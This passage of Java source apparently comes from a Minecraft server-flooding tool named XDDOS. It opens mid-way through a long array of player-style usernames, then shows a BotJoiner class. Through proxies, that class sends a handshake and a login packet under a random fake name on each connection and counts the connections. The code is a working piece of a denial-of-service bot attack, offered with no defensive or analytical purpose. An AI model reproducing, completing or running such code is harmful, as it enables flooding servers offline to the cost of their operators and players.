"scaryghost2002", "___Mayonaise___", "GdvR_", "robsepa", "BannanaHamock", "TakamasuZhet", "Hiiol1", "DemolitionForce", "wispie_crispie", "rnoble001", "Dionysus25", "TheDynamite12", "GANGMEMBERRXS", "MrOliBoi", "rosoB6", "CupcakeLoverBoy", "Jiju__", "thatcoolfrog", "cellarmaster", "Samuraiz3143", "RKamm01", "bbycash", "Robyy321", "Renegade122", "da_shaman", "OXace1", "jackaw", "RiverdudeCovers", "ClaireXH", "rileypienkowski", "JoshWithA5", "RishMishGamer20", "h8xade", "riley_226", "Eisballi", "Fae_Moss", "Robzilladude", "RiiVu69", "SparrowFlys", "Mijauy", "Axisss", "The_CageyBee", "rick_013", "AlaztriA", "CocoQwerty", "Rick31", "AtlasMkV", "2k21", "KingKong00000", "RorySnipeZ", "Cookie_Man19", "EP0214", "Freese", "Richardv304", "Ricepud07", "JuliettSierra", "Rhi_98", "420lovebug", "Vtree_", "Dad4Higher", "poelske123", "CrazyMonkey_16", "Ytane", "rexwee", "Shadowarrior58", "trublurisachu", "exxsu", "1157richard", "d_reaming", "xd_nardss", "plucky_wolf", "Clossos", "Da_XD_King", "Itz_CrunchTime", "Pain225", "Magu6oN", "SmileEKT", "Ricky1118", "Danparsoa", "Rspar23", "LionsHunter2", "BononboChimpMan", "sinosuke", "Reles10", "Der_Butscher", "9DrunkNinjaFoxes", "snapcrackl3pop9", "ReeseIsDum", "LouisVanGeest", "tug_man", "FENO_MATE", "CuteElo", "Reenaskye", "Bebecca", "Hickey0903", "Kyomasa", "ValentineVII", "DiabloTheDark", "ReaperOfSoulss", "10TeRaByTe_XL", "123rio321", "Becca354", "NiKExxSwAGxx27", "rcb4", "Toxic_snowman786", "deredninja", "not_rnbwuncrn", "XScorpion2", "N1njam4st3r", "fireforge92", "reflectiveforge", "Snofoxgiven", "X_ROCKER_9", "Ravensgrim", "xxSdogxx", "SpeedyMaGicXz", "HannahsMind", "My_name_is_Bubba", "pptickler1", "HOTBOY0414", "LethalUwU", "Raven822", "PenkoMC", "ransunday", "hunnnymoon", "Raethi", "Midknight_night", "lAmNuts", "Rake001", "zika199", "End_Myster", "ec2011", "ClapYoHandz", "Mr_Psycho26", "nangsandlsd", "Skrampsnake16", "Red0548", "soiceey", "drlpplngp3aches", "radanta", "Tacos6547", "Rajyk", "Joeners", "Archer_3000", "ICE1701A", "rajdi8", "theLostLight_", "r2cole", "quintin108", "VASILISA4KA", "Kekasi", "MisterPuppyy", "PlumbingOrca183", "johnyboy909", "7tisfied", "Soldes", "Best_coding", "MaximumRewind", "BruhItzSarah_", "Moe_Lester158", "PringleBird34", "SinCosTan2x", "Vaspyx", "morrisfam3", "mayb_rose", "Pacific_Gentry", "Zardsor", "McMoshiSoshi", "rae_z", "RaienTetsu", "kuba_1167", "TSG_Pride", "Crossled", "Shaffer108", "SpeckMC", "TypeUsernameHere", "radin519", "PoorCarrot", "MSI_Necrosis", "Rodolcraft", "wuffyuwu", "raxy7", "Xnxo", "MRYaG", "NavyRed", "HaroldDeSlager", "SANDERZZZ98", "LionRampant00", "piravypara", "Plankicorn", "Portuguese_Goku", "kitty_klaws_", "rkoswag", "bale11rules", "AndreTheMaster", "Piet100e", "CLBVALDRIGHI", "human10382", "Ilica_", "CHEECHIP", "L0rdBlackadder", "Bowman051", "luca234234", "Nerdy_Mess", "MuffaluffinsDad", "Legweak", "Mikonoru", "DrSirLeviathan", "kind0204", "ToastySlayer", "_vArittharanon", "Filup15", "headkittens", "Inkubo", "RandomYouri", "BestiaZWadowicc" };










































































































































































































    return names[(new Random()).nextInt(names.length - 1)];
  }

  public BotJoiner() {
    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomName())).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
